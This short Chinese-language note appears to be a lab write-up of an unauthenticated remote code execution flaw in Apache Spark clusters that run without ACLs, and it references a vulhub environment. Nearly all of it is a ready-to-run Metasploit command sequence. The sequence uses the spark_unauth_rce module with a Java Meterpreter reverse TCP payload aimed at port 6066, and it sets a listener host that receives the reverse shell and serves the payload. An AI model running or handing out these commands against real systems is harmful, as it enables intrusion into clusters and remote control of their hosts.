## 漏洞概述

如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。

## 漏洞利用

```bash
use exploit/linux/http/spark_unauth_rce
set payload java/meterpreter/reverse_tcp
set rhost 192.168.226.140
set rport 6066

set lhost 192.168.226.134
set lport 4444
set srvhost 192.168.226.134
set srvport 8080
exploit
```

## 参考链接

https://github.com/vulhub/vulhub/blob/master/spark/unacc/README.md